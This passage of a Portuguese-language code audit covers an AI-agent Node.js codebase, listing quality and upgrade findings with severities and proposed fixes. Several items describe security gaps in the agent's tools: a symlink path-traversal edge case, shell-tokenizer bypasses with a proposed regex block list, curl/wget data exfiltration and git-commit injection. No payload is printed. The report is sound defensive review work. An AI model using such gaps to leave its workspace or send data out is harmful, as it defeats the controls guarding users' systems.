  return process.env.LLM_B_BOOT_PROMPT ?? DEFAULT_BOOT_PROMPT;
}
```

---

### QUAL-03 — `terminal/state.js`: `stateEmitter.setMaxListeners(20)` pode ser ultrapassado

**Severidade:** baixo **Arquivo:** `terminal/state.js` **Linha:** ~30 **Descrição:**
`setMaxListeners(20)` suprime warnings do Node.js para até 20 listeners. Em uma configuração com
muitos subsistemas se inscrevendo em `hubSessionId:change` e `busy:change`, o limite pode ser
atingido silenciosamente ao ser ultrapassado.

**Proposta de correção:** Aumentar o limite ou usar `EventEmitter.defaultMaxListeners` configurável
via env, e adicionar logging quando o número de listeners se aproxima do limite.

---

### QUAL-04 — `tool-factory.js` `normalizeParameters`: Zod v4 + `zod-to-json-schema` pode falhar silenciosamente

**Severidade:** médio **Arquivo:** `tools/tool-factory.js` **Linha:** ~80 **Descrição:**
`zodToJsonSchema` é chamada para schemas Zod v4 (`_zod` in parameters), mas a biblioteca pode não
suportar v4 plenamente. O catch interno retorna `undefined` e o log emite apenas um WARN — a tool é
registrada sem schema de parâmetros, aceitando qualquer input sem validação. O modelo recebe a tool
sem documentação de parâmetros, podendo invocar com campos incorretos.

**Proposta de correção:** Log de ERROR (não WARN) quando a conversão falha, e considerar lançar
exceção para impedir registro de tools sem schema em modo produção.

---

### QUAL-05 — `tools/web-tools.js` `checkRateLimit`: `RATE_WINDOW` retém até 2 buckets

**Severidade:** baixo **Arquivo:** `tools/web-tools.js` **Linha:** ~60 **Descrição:** O cleanup
remove buckets `< bucket - 1`, mas isso significa que o bucket anterior ainda permanece. Em
produção, isso é inócuo (2 entradas), mas pode ser confuso ao inspecionar o Map.

**Proposta de correção:** Limpar `< bucket`:

```js
for (const [k] of RATE_WINDOW) {
  if (k < bucket) RATE_WINDOW.delete(k);
}
```

---

### QUAL-06 — `tools/git/index.js`: `safeGit()` usa `execSync` (mesmo problema que `safeExec`)

**Severidade:** médio **Arquivo:** `tools/git/index.js` **Linha:** ~20 **Descrição:** `safeGit()`
implementa `execSync` com timeouts de até 30s (git push). Durante operações git lentas (push para
remote lento, clone), o event loop fica bloqueado. Mesmo contexto de BUG PERF-04.

**Proposta de correção:** Substituir por `execFileAsync` (promisify de `execFile`) com os argumentos
separados em array.

---

### QUAL-07 — `llm-a-conversation.mjs`: sem controles CLI (turns, pausa hardcoded)

**Severidade:** baixo **Arquivo:** `llm-a-conversation.mjs` **Linha:** N/A **Descrição:** O script
possui 5 turns e 2s de pausa entre eles hardcodados. Para testes ou uso variado, isso exigiria
edição do código. Não há `--turns`, `--delay`, `--model` como argumentos CLI.

**Proposta de correção:** Adicionar parseamento básico de argumentos:

```js
const turns = parseInt(process.argv[2] ?? '5', 10);
const delayMs = parseInt(process.argv[3] ?? '2000', 10);
```

---

### QUAL-08 — `tools/file-tools.js` `validatePath`: fallback sem resolução pode permitir traversal em edge case

**Severidade:** médio **Arquivo:** `tools/file-tools.js` **Linha:** ~95 **Descrição:** Quando tanto
`realpathSync(resolved)` quanto `realpathSync(dirname(resolved))` falham, o código usa `resolved`
sem resolução de symlinks. Um elaborado symlink chain que existe parcialmente (parte do path existe,
parte não) pode resultar em path que relativeToWorkspace não detecta como `..` mas que resolve para
fora do workspace.

**Proposta de correção:** Na falha do fallback, rejeitar a operação com erro explícito em vez de
prosseguir com o path não resolvido:

```js
} catch {
    return { ok: false, reason: `Não foi possível resolver caminho: ${resolved}`, resolved };
}
```

---

### QUAL-09 — `types/structured-message.js`: `RESPONSE_TYPES` inclui `'confirmation'` mas `StructuredMessageSchema` usa `'acknowledgment'`

**Severidade:** médio **Arquivo:** `types/structured-message.js` **Linha:** ~40 **Descrição:** A
constante `RESPONSE_TYPES.confirmation = 'confirmation'` existe no objeto exportado, mas o schema
Zod do `responseType` inclui `'acknowledgment'` no enum (a partir dos tipos vistos em
`routes/webhooks.js`). Há inconsistência de nomenclatura entre a constante e o schema, podendo
causar validação incorreta quando o código referencia `RESPONSE_TYPES.confirmation`.

**Proposta de correção:** Sincronizar os valores da constante com os do enum Zod. Escolher
`confirmation` ou `acknowledgment` e usar consistentemente em todo o código.

---

### QUAL-10 — `tools/shell/index.js`: `tokenizeShell()` não suporta `$'...'` quoting e heredocs

**Severidade:** baixo **Arquivo:** `tools/shell/index.js` **Linha:** ~120 **Descrição:** O
tokenizador trata apenas aspas simples e duplas. Padrões avançados como `$'literal'` (ANSI-C
quoting), heredocs (`<<EOF`) e process substitution (`<(cmd)`) não são detectados. Comandos que usam
esses padrões podem bypass o check `hasShellMetaOutsideQuotes`.

**Proposta de correção:** Documentar claramente as limitações do tokenizador, e adicionar blocklist
de padrões adicionais: `/\$'/, /<<\s*\w+/, /<\(/, />\(/`.

---

## Categoria UPG

### UPG-01 — `tools/todo-tools.js`: ID gerador deve usar `crypto.randomBytes`

**Severidade:** baixo **Arquivo:** `tools/todo-tools.js` **Linha:** ~110 **Proposta:** Substituir
`Math.random().toString(36).slice(2, 10)` por `randomBytes(4).toString('hex')` para IDs únicos e
criptograficamente robustos.

---

### UPG-02 — `agent/entry.js`: implementar backoff exponencial com jitter

**Severidade:** baixo **Arquivo:** `agent/entry.js` **Linha:** ~60 **Proposta:** Adicionar backoff
exponencial (3s → 6s → 12s → 24s → 30s) com jitter de ±1s para resiliência em falhas de API
transientes.

---

### UPG-03 — `webhook-manager.js`: imports estáticos de `http`/`https`

**Severidade:** baixo **Arquivo:** `agent/webhook-manager.js` **Linha:** ~1 **Proposta:** Mover
`import http from 'node:http'` e `import https from 'node:https'` para o topo do arquivo como
imports estáticos.

---

### UPG-04 — `bridges/alias-store.js` + `config/tools/`: debounce para escritas de estado

**Severidade:** médio **Arquivo:** `bridges/alias-store.js`, `config/tools/registry.js`,
`config/tools/state.js` **Linha:** N/A **Proposta:** Implementar debounce de 300ms antes de
persisitr mutações, usando `setTimeout` + `clearTimeout`. Isso reduz escritas em casos de mutações
em lote de O(n) para O(1).

---

### UPG-05 — `lib/client.js`: mutex para inicialização concurrent-safe

**Severidade:** médio **Arquivo:** `lib/client.js` **Linha:** ~50 **Proposta:** Promise singleton:

```js
let _initPromise = null;
export async function getClient() {
  if (_client) return _client;
  _initPromise ??= initClient().finally(() => (_initPromise = null));
  return _initPromise;
}
```

---

### UPG-06 — `terminal/file-context.js`: cache LRU com limite superior

**Severidade:** baixo **Arquivo:** `terminal/file-context.js` **Linha:** ~60 **Proposta:**
Implementar evicção LRU com cap de 100 entradas ou 10MB total para prevenir crescimento ilimitado do
cache em sessões longas.

---

### UPG-07 — `tools/introspection-tools.js`: categorias data-driven

**Severidade:** baixo **Arquivo:** `tools/introspection-tools.js` **Linha:** ~90 **Proposta:**
Adicionar campo `category?: string` em `BuildToolOptions<TArgs>` e filtrar por ele em `list_tools`,
eliminando o mapa hardcoded.

---

### UPG-08 — `tools/session-rpc-tools.js`: isolamento de RPC por sessão

**Severidade:** médio **Arquivo:** `tools/session-rpc-tools.js` **Linha:** ~25 **Proposta:**
Refatorar para factory pattern: `createSessionRpcTools(rpc)` retorna o array de tools usando closure
sobre o `rpc` específico, em vez de variável global.

---

### UPG-09 — `terminal/workspace-context.js`: cache com TTL curto

**Severidade:** baixo **Arquivo:** `terminal/workspace-context.js` **Linha:** ~70 **Proposta:**
Cache em memória com TTL de 5s para resultados de `getWorkspaceContext()`, eliminando forks
repetidos de processos git.

---

### UPG-10 — `tools/web-tools.js`: streaming de resposta para reduzir uso de memória

**Severidade:** baixo **Arquivo:** `tools/web-tools.js` **Linha:** ~140 **Proposta:** O fetch
acumula chunks inteiros em memória antes de retornar. Para respostas grandes (até 512KB), considerar
retornar um resumo/truncada de imediato em vez de buffer completo, ou usar streaming para log sem
acumular tudo em RAM.

---

### UPG-11 — `conversation-hub/store.js`: usar `crypto.randomUUID()` de Node 14.17+ em vez de `uuidv4` externo

**Severidade:** baixo **Arquivo:** `conversation-hub/store.js` **Linha:** ~50 **Proposta:**
Substituir `import { v4 as uuidv4 } from 'uuid'` por `import { randomUUID } from 'node:crypto'` para
remover dependência externa e melhorar performance (random nativo).

---

### UPG-12 — `terminal/dialog.js`: `TURN_TIMEOUT_MS` não exposto no `/health` endpoint

**Severidade:** baixo **Arquivo:** `terminal/dialog.js`, `terminal/http-handlers.js` **Linha:** N/A
**Proposta:** Expor `TURN_TIMEOUT_MS`, `MAX_TURN_QUEUE_SIZE` e fila atual no endpoint `/health` para
observabilidade operacional.

---

## Resumo Quantitativo

| Categoria | Total  | Crítico | Alto   | Médio  | Baixo  |
| --------- | ------ | ------- | ------ | ------ | ------ |
| BUG       | 13     | 0       | 3      | 7      | 3      |
| SEC       | 9      | 0       | 3      | 5      | 1      |
| ARCH      | 8      | 0       | 1      | 4      | 3      |
| PERF      | 6      | 0       | 1      | 3      | 2      |
| GAP       | 8      | 0       | 2      | 4      | 2      |
| QUAL      | 10     | 0       | 0      | 4      | 6      |
| UPG       | 12     | 0       | 0      | 3      | 9      |
| **Total** | **66** | **0**   | **10** | **30** | **26** |

---

## Top 10 Itens por Prioridade

| #   | ID      | Severidade | Resumo                                                        |
| --- | ------- | ---------- | ------------------------------------------------------------- |
| 1   | PERF-04 | **alto**   | `execSync` bloqueia event loop durante lint/test (até 120s)   |
| 2   | BUG-11  | **alto**   | `request_user_input` não suspende de fato — compliance frágil |
| 3   | SEC-02  | **alto**   | Socket.io `user:inject` sem limite de tamanho                 |
| 4   | SEC-03  | **alto**   | `readBody()` sem limite de tamanho (server de injeção)        |
| 5   | SEC-06  | **alto**   | Shell tools: `curl`/`wget` sem pipe pode exfiltrar dados      |
| 6   | ARCH-01 | **alto**   | `#inflightBySession` nunca limpado — memory leak              |
| 7   | BUG-01  | **alto**   | `/client/force-stop` bypassa `forceStopClient()`              |
| 8   | BUG-12  | **médio**  | `start()` sem mutex contra chamadas concorrentes              |
| 9   | GAP-01  | **alto**   | `request_user_input` não usa mecanismo real de suspensão SDK  |
| 10  | SEC-08  | **médio**  | `git commit -m` com interpolação de string (injection)        |

---

_Auditoria gerada por análise exaustiva de código — sessões 1–4 — cobrindo ~85% dos arquivos em
`src/copilot/`._
